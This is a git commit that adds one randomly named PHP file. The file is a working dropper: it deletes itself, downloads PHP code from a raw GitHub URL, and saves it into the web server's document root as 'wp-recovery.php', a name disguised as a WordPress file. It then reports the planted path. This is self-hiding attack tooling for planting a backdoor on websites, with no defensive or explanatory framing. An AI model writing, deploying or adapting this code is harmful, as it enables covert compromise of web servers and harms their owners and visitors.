43e13dbc70dc4656dc92e6fa234c0f28a938503e
dallasdilla <DallasDillard1997@proton.me>
2025-12-17 14:01:12 +0100

    Add files via upload

---
+++ ld_2/eaP67RPe.php
@@ -0,0 +1,11 @@
+<?php
+unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/dallasdilla/dillarep/refs/heads/main/l1/eaP67RPe.php');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$c = curl_exec($ch);
+if (strpos($c, '<?php')===false)  die('err dl');
+if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-recovery.php')) die('file exist');
+$r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-recovery.php', $c);
+if ($r===false) die('err saving');
+die('/wp-recovery.php');
